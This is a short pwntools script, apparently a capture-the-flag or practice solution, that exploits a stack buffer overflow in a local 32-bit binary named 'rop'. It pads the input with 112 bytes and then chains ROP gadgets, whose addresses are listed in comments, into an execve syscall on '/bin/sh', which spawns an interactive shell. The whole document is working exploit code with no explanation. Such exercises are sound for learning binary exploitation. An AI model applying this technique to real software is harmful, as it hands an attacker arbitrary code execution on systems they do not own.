#0x080bb196 : pop eax ; ret
#0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
#0x08049421 : int 0x80
#0x080be409 : bin/sh

from pwn import *
sh=process('./rop')
#sh.recvuntil("What do you plan to do?")
pop_eax_ret=0x080bb196
pop_edx_ecx_ebx_ret=0x0806eb90
int_80h=0x08049421
binsh=0x080be408
payload =flat([b'A'*112,pop_eax_ret,0xb,pop_edx_ecx_ebx_ret,0,0,binsh,int_80h])
sh.sendline(payload)
sh.interactive()
